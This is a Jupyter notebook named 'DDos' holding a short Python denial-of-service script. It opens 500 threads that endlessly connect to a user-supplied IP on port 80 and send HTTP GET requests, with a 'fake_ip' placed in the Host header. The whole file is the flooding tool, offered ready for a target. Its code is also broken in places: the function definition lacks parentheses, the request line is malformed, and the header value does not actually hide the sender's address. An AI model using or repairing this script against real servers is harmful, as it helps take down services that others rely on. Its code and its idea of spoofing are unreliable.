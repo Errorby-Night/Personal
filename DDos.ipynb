{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import threading"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "target='' #enter the ip address here\n",
    "port=80\n",
    "fake_ip='182.35.69.45'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def attack:\n",
    "    while True:\n",
    "        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n",
    "        s.connect((target,port))\n",
    "        s.sendto((\"GET /\"+target+\"HTTP/1.1\\r\\n\").encode('ascii'),(target,port))\n",
    "        s.sendto((\"Host: \"+fake_ip+\"\\r\\n\\r\\n\").encode('ascii'),(target,port))\n",
    "        s.close()\n",
    "        \n",
    "for i in range(500):\n",
    "    thread=threading.Thread(target=attack)\n",
    "    thread.start()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
